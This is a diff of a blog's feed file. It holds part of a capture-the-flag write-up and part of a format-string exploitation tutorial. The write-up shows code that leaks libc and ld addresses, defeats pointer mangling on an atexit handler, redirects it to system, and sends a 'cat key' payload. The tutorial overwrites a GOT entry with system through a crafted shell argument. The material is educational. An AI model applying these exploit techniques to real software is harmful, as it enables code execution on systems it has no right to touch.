+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;free_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arbitrary_read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prog_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x4f2c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prog_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x5160&lt;/span&gt;
+&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;free_addr&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x781b0&lt;/span&gt;
+&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x3d170&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Except this didn't work - the program had full RELRO support, so the GOT was
+read only. &lt;/p&gt;
+&lt;p&gt;To get around this, we had to do some painful stuff. We noticed a directory
+traversal attack in the login function, and though we could use that to put the
+key into the heap (and read it later). Unfortunately, the &lt;code&gt;malloc&lt;/code&gt;
+implementation  seemed to clobber the key after it freed the blob. Instead, 
+our strategy
+was to overwrite an &lt;code&gt;atexit&lt;/code&gt; handler function pointer located in &lt;code&gt;libc&lt;/code&gt; with the
+address of &lt;code&gt;system&lt;/code&gt; and to overwrite the argument for this handler with a buffer
+we controlled. Unfortunately, this function pointer was encrypted. To decrypt, 
+we computed what the function pointer was supposed to be by leaking an address 
+from &lt;code&gt;ld.so&lt;/code&gt; and using the address and the encrypted value to calculate the key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;rtld_global_ro_address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arbitrary_read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a0ef8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ld_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;rtld_global_ro_address&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x20ca0&lt;/span&gt;
+&lt;span class="n"&gt;ld_fini_address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ld_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0xf270&lt;/span&gt;
+&lt;span class="n"&gt;encrypted_atexit_handler&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arbitrary_read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a21ec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;xor_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ror&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted_atexit_handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;ld_fini_address&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We then encrypted our target address with this key, update the function pointer
+to use our new address and updated the argument to point to a buffer we
+controlled&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;encrypted_system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;rol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;xor_key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;arbitrary_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a21ec&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encrypted_system&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;arbitrary_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a21f0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;obj0&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x110&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To trigger our exploit, we just sent the disconnect message (which fortunately 
+didn't disconnect the socket). For our final exploit, we used the payload 
+&lt;code&gt;cat key &amp;gt;&amp;amp;4&lt;/code&gt; to dump the key to the already open socket.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python gitsmsg.py
+&lt;span class="go"&gt;Deleting messages ...&lt;/span&gt;
+&lt;span class="go"&gt;Performing overflow ...&lt;/span&gt;
+&lt;span class="go"&gt;Editing ...&lt;/span&gt;
+&lt;span class="go"&gt;Getting ...&lt;/span&gt;
+&lt;span class="go"&gt;Getting libc base ...&lt;/span&gt;
+&lt;span class="go"&gt;Getting ld base ...&lt;/span&gt;
+&lt;span class="go"&gt;Writing encrypted function pointer ...&lt;/span&gt;
+&lt;span class="go"&gt;The key is: lol, tagged unions for the WIN!&lt;/span&gt;
+&lt;span class="go"&gt;*** Connection closed by remote host ***&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="ctf"></category><category term="exploitation"></category></entry><entry><title>Reading resumes</title><link href="http://codearcana.com/posts/2013/09/25/reading-resumes.html" rel="alternate"></link><updated>2013-09-25T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-09-25:posts/2013/09/25/reading-resumes.html</id><summary type="html">&lt;p&gt;Tonight, I sat down and read through every resume in the 2013 SCS senior
 resume book. Reading resumes for a company is really interesting, because
 I find myself looking at them very differently. As a student, I didn't
 really understand what sections of the resume are important. I thought
@@ -1421,7 +1665,7 @@ of &lt;code&gt;buffer&lt;/code&gt;, we can get a shell!).&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Over plan is going to be to overwrite the GOT entry of &lt;code&gt;strdup&lt;/code&gt; with the address of &lt;code&gt;system&lt;/code&gt;, so the program
+&lt;p&gt;Our plan is going to be to overwrite the GOT entry of &lt;code&gt;strdup&lt;/code&gt; with the address of &lt;code&gt;system&lt;/code&gt;, so the program
 will &lt;code&gt;printf(argv[1])&lt;/code&gt; then &lt;code&gt;system(argv[1])&lt;/code&gt;. Hence, our payload must be a valid argument to &lt;code&gt;system&lt;/code&gt; - we will
 start our payload with &lt;code&gt;sh;#&lt;/code&gt; (which will be &lt;code&gt;sh&lt;/code&gt; and cause the rest of the payload to be a comment. 
 This also has the advantage of being exactly 4 bytes long, which isn't important for this example 
@@ -1467,7 +1711,7 @@ passed onto the stack before the start of a program).&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Now we know where to write. We want to the address of &lt;code&gt;system&lt;/code&gt; to the &lt;code&gt;strdup&lt;/code&gt; got entry, &lt;code&gt;0x804a004&lt;/code&gt;. 
+&lt;p&gt;Now we know where to write. We want to write the address of &lt;code&gt;system&lt;/code&gt; to the &lt;code&gt;strdup&lt;/code&gt; got entry, &lt;code&gt;0x804a004&lt;/code&gt;. 
 For now, we plug in our address into the payload and make sure everything still works out:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08&lt;span class="se"&gt;\x&lt;/span&gt;06&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08%00000x%99&lt;span class="nv"&gt;$hp&lt;/span&gt;%00000x%100&lt;span class="nv"&gt;$hp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
 &lt;span class="gp"&gt;sh;#&lt;/span&gt;00x804a00480484490x804a006
